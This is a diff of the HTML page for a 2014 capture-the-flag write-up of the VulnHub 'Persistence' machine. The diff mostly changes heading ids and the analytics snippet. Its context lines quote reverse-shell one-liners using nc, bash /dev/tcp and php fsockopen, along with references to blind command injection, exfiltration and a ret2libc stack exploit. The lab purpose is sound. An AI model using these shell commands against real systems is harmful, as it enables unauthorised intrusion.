@@ -18,6 +18,7 @@
   <link rel="stylesheet" href="https://leonjza.github.io/css/highlight/solarized_light.css">
   <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=PT+Sans:400,400italic,700|Abril+Fatface">
   <link rel="stylesheet" href="//maxcdn.bootstrapcdn.com/font-awesome/4.3.0/css/font-awesome.min.css">
+  
 
   
   <link rel="apple-touch-icon-precomposed" sizes="144x144" href="https://leonjza.github.io/touch-icon-144-precomposed.png">
@@ -30,6 +31,16 @@
 
   <meta name="description" content="">
   <meta name="keywords" content="">
+  
+  <script>
+    (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+    (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+    m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+    })(window,document,'script','//www.google-analytics.com/analytics.js','ga');
+
+    ga('create', 'UA-44457032-2', 'auto');
+    ga('send', 'pageview');
+  </script>
   
 </head>
 <body class="theme-base-0d">
@@ -76,7 +87,7 @@
 
 <div class="content container">
   <div class="post">
-    <h1>From Persistence</h1>
+    <h1 class="post-title">From Persistence</h1>
     <span class="post-date">Sep 18, 2014 &middot; 33 minute read &middot; <a href="https://leonjza.github.io/blog/2014/09/18/from-persistence/#disqus_thread">Comments</a>
     
     <br/>
@@ -84,13 +95,13 @@
     </span>
     
 
-<h2 id="persist-we-must:86c048549ce161bd5ac3e0fef5e4f842">persist we must!</h2>
+<h2 id="persist-we-must">persist we must!</h2>
 
 <p>Persistence! A new boot2root hosted <a href="https://twitter.com/vulnhub">@VulnHub</a>, authored by <a href="https://twitter.com/superkojiman">@superkojiman</a> and sagi- definitely got the attention from the community it deserves! Persistence was actually part of a <a href="http://blog.vulnhub.com/2014/09/competition-persistence.html">writeup competition</a> launched on September the 7th, and ran up until October th 5th.</p>
 
 <p>This is my experience while trying to complete the challenge. Persistence, once again, challenged me to learn about things that would normally have me just go &ldquo;meh, next&rdquo;. As expected, this post is also a very big spoiler if you have not completed it yourself yet, so be warned!</p>
 
-<h2 id="lets-get-our-hands-dirty:86c048549ce161bd5ac3e0fef5e4f842">lets get our hands dirty</h2>
+<h2 id="lets-get-our-hands-dirty">lets get our hands dirty</h2>
 
 <p>As usual, the goto tool was Kali Linux, and the normal steps of adding the OVA image to Virtualbox, booting, finding the assigned IP and running a Nmap scan against it was used.</p>
 
@@ -144,7 +155,7 @@ No input file specified.
 
 <p>As can be seen in the output above, the header <code>X-Powered-By: PHP/5.3.3</code> is now present, and the output <code>No input file specified.</code>. I recognized this as the behavior of Nginx when PHP-FPM is unable to locate the .php file it should be serving.</p>
 
-<h2 id="finding-that-de-bugger:86c048549ce161bd5ac3e0fef5e4f842">finding that (de)bugger</h2>
+<h2 id="finding-that-de-bugger">finding that (de)bugger</h2>
 
 <p>With this information now gathered, it was time to pull out one of my favorite tools, <code>wfuzz</code>! With <code>wfuzz</code>, the plan now was to attempt and discover a potentially interesting web path, or, because I know the web server has the capability of serving up PHP content, attempt to find arb PHP scripts.</p>
 
@@ -180,7 +191,7 @@ ID  Response   Lines      Word         Chars          Request
 
 <p>&ldquo;Command injection?&rdquo;, was the first thought here.</p>
 
-<h2 id="blind-command-injection:86c048549ce161bd5ac3e0fef5e4f842">blind command injection</h2>
+<h2 id="blind-command-injection">blind command injection</h2>
 
 <p>I started by entering a valid IP address that had <code>tcpdump</code> listening to test if the script is actually running a ping like it says &hellip;</p>
 
@@ -205,7 +216,7 @@ listening on eth0, link-type EN10MB (Ethernet), capture size 65535 bytes
 
 <p>I tried the usual culprits: <code>nc &lt;ip&gt;  &lt;port&gt; -e /bin/bash</code>; <code>bash -i &gt;&amp; /dev/tcp/&lt;ip&gt;/&lt;port&gt; 0&gt;&amp;1</code>; <code>php -r '$sock=fsockopen(&quot;&lt;ip&gt;&quot;,&lt;port&gt;);exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);'</code>. None of them worked. Eventually I started to realize that I may have a much bigger problem here. What if none of these programs (nc/bash/php) are either not executable by me or simply not in my PATH? What if there was a egress packet filter configured?</p>
 
-<h2 id="blind-command-injection-file-enumeration:86c048549ce161bd5ac3e0fef5e4f842">blind command injection - file enumeration</h2>
+<h2 id="blind-command-injection-file-enumeration">blind command injection - file enumeration</h2>
 
 <p>Ok, so I took one step back and had to rethink my strategy. I have blind command execution, but how am I going to find out what else is going on on the filesystem? Up to now I have simply assumed too much.</p>
 
@@ -228,7 +239,7 @@ listening on eth0, link-type EN10MB (Ethernet), capture size 65535 bytes
 
 <p>I continued to test numerous files on numerous locations on disk. I noticed a few files that would generally be available on most Linux systems were not available according to my checker which was really odd. It actually had me doubt the check too. Nonetheless,  <code>/usr/bin/python</code> appeared to be available! I really like python so this had me really happy.</p>
 
-<h2 id="blind-command-injection-port-scanner:86c048549ce161bd5ac3e0fef5e4f842">blind command injection - port scanner</h2>
+<h2 id="blind-command-injection-port-scanner">blind command injection - port scanner</h2>
 
 <p>I tested a few commands with <code>python -c</code>, such as sleep etc just to confirm that it is working. I then proceeded to try and get a reverse shell going using it.</p>
 
@@ -246,7 +257,7 @@ for port in xrange(1, 65535):
 
 <p>Using my blind command injection, I echoed this content to <code>/tmp/probe.py</code> via the input field, and then in a subsequent request, ran it using <code>python /tmp/probe.py</code>. I was relatively certain the script was running as intended as it took the expected amount of time (similar to when I was testing locally) to complete the HTTP request. According to my prober (and assuming it actually worked), there were 0 tcp ports open&hellip;</p>
 
-<h2 id="data-exfiltration:86c048549ce161bd5ac3e0fef5e4f842">data exfiltration</h2>
+<h2 id="data-exfiltration">data exfiltration</h2>
 
 <p>With no tcp out, I had to once again rethink what I have up to now. The only output I have atm is a true/false scenario. Hardly sufficient to do anything useful. I found the <code>debug.php</code> file on disk and tried to echo a PHP web shell to the same directory. This also failed.</p>
 
@@ -332,7 +343,7 @@ oups=498(nginx)
 oups=498
 </code></pre>
 
-<h2 id="sysadmin-tool:86c048549ce161bd5ac3e0fef5e4f842">sysadmin-tool</h2>
+<h2 id="sysadmin-tool">sysadmin-tool</h2>
 
 <p>So with actual output to work with, I can almost say I have shell, however, it&rsquo;s crap. Here I had many options to go for. Do I try and get one of those ping tunnels up to shell with? Or something else.</p>
 
@@ -387,7 +398,7 @@ Nmap done: 1 IP address (1 host up) scanned in 6637.05 seconds
 
 <p>Yay! SSH.</p>
 
-<h2 id="shell-and-breakout-as-avida:86c048549ce161bd5ac3e0fef5e4f842">shell and breakout as avida</h2>
+<h2 id="shell-and-breakout-as-avida">shell and breakout as avida</h2>
 
 <p>Using the information that looked like credentials retrieved in the previous section, I proceeded to SSH into the server:</p>
 
@@ -419,7 +430,7 @@ bash-4.1$
 
 <p>I got dropped into another <code>rbash</code> shell, however this time with a +. So, I went for <code>/bin/bash</code> and&hellip; w00t? I exported a new PATH to my environment, and all of those annoying rbash restrictions were gone. Thank goodness!</p>
 
-<h2 id="the-wopr-game:86c048549ce161bd5ac3e0fef5e4f842">the wopr game</h2>
+<h2 id="the-wopr-game">the wopr game</h2>
 
 <p>During the enumeration done while still stuck with <code>rbash</code>, I noticed that the machine was listening for connections on tcp/3333 locally when inspecting the output of <code>netstat</code>. Opening a telnet session to this port presented you with a &lsquo;game&rsquo;:</p>
 
@@ -467,7 +478,7 @@ root@kali:~# cat wopr.xxd | xxd -r -p &gt; wopr
 
 <p>The idea was to see if there may be a way to exploit this program so that I can execute some commands using it. It is running as root after all&hellip;</p>
 
-<h2 id="wopr-stack-smashing:86c048549ce161bd5ac3e0fef5e4f842">wopr, stack smashing</h2>
+<h2 id="wopr-stack-smashing">wopr, stack smashing</h2>
 
 <p>Poking around the binary, I mostly used <code>gdb</code> along with <a href="https://github.com/longld/peda">peda</a>.
 Checksec revealed that this binary was compiled with quite a few security features built in.</p>
@@ -576,7 +587,7 @@ With the debugging we have done thus far, lets assume that the stack layout look
 - -&gt;         - -&gt;        [42 Bytes  in Total]        - -&gt;         - &gt;
 </code></pre>
 
-<h2 id="wopr-stack-canary-bruteforce:86c048549ce161bd5ac3e0fef5e4f842">wopr - stack canary bruteforce</h2>
+<h2 id="wopr-stack-canary-bruteforce">wopr - stack canary bruteforce</h2>
 
 <p>This part of the challenge took me the second longest to nail. I have zero knowledge of stack cookies, let alone experience in bypassing them. So I had to pack out my best Google-fu abilities and learn all I can about bypassing these cookies.</p>
 
@@ -698,7 +709,7 @@ else:
 
 <p>Winning. Just to make 100% sure I actually have the correct canary, I made another small socket program just to append the canary to the initial 30 A&rsquo;s and send it. No stack smashing message appeared and we got the <em>bye</em> message :)</p>
 
-<h2 id="wopr-nx-and-eip:86c048549ce161bd5ac3e0fef5e4f842">wopr - NX and EIP</h2>
+<h2 id="wopr-nx-and-eip">wopr - NX and EIP</h2>
 
 <p>If you can recall from earlier, <code>wopr</code> was compiled with the NX bit set. Effectively that means we can&rsquo;t simply exploit this vulnerability by setting EIP to the beginning of shellcode we simply sent along with the payload as the stack is not executable. Thankfully though, there is a concept such as ret2libc.</p>
 
@@ -752,7 +763,7 @@ $1 = {&lt;text variable, no debug info&gt;} 0xb7e56210 &lt;system&gt;
 
 <p>The address for <code>system()</code> is &lsquo;backwards&rsquo; because we are working with a <a href="http://en.wikipedia.org/wiki/Endianness">little endian</a> system. The 4 * A before the address to <code>system()</code> is simply padding to EIP.</p>
 
-<h2 id="wopr-code-exec:86c048549ce161bd5ac3e0fef5e4f842">wopr - code exec</h2>
+<h2 id="wopr-code-exec">wopr - code exec</h2>
 
 <p>This part, by far, took me <strong>the longest</strong> of the entire challenge!</p>
 
@@ -850,7 +861,7 @@ wopr : 0x8049c60 (&quot;/tmp/log&quot;)
 
 <p><code>/tmp/log</code> can be found in 2 places. Lets choose <code>0x8048c60</code>! Now we finally have everything we need to build the payload to send.</p>
 
-<h2 id="wopr-the-exploit:86c048549ce161bd5ac3e0fef5e4f842">wopr - the exploit</h2>
+<h2 id="wopr-the-exploit">wopr - the exploit</h2>
 
 <p>To sum up what we have to do to exploit this, we can say that we have to:</p>
 
@@ -1073,11 +1084,11 @@ valuable feedback!</p>
       sagi- &amp; superkojiman
 ```</p>
 
-<h2 id="conclusion:86c048549ce161bd5ac3e0fef5e4f842">conclusion</h2>
+<h2 id="conclusion">conclusion</h2>
 
 <p>Persistence kicked ass!! I learned a ton and that is the ultimate win. Thanks sagi- &amp;&amp; superkojiman for an incredible challenge! Thanks Vulnhub for the hosting and community!</p>
 
-<h2 id="thats-not-all:86c048549ce161bd5ac3e0fef5e4f842">thats not all</h2>
+<h2 id="thats-not-all">thats not all</h2>
 
 <p>There are however a few more things I&rsquo;d like to try.</p>
 
@@ -1117,14 +1128,6 @@ var disqus_shortname = "slashnote";
 
 <script src="https://leonjza.github.io/js/highlight.pack.js"></script>
 <script>hljs.initHighlightingOnLoad();</script>
-
-<script>
-  var _gaq=[['_setAccount','UA-44457032-2'],['_trackPageview']];
-  (function(d,t){var g=d.createElement(t),s=d.getElementsByTagName(t)[0];
-  g.src=('https:'==location.protocol?'//ssl':'//www')+'.google-analytics.com/ga.js';
-  s.parentNode.insertBefore(g,s)}(document,'script'));
-</script>
-
 </body>
 </html>
 
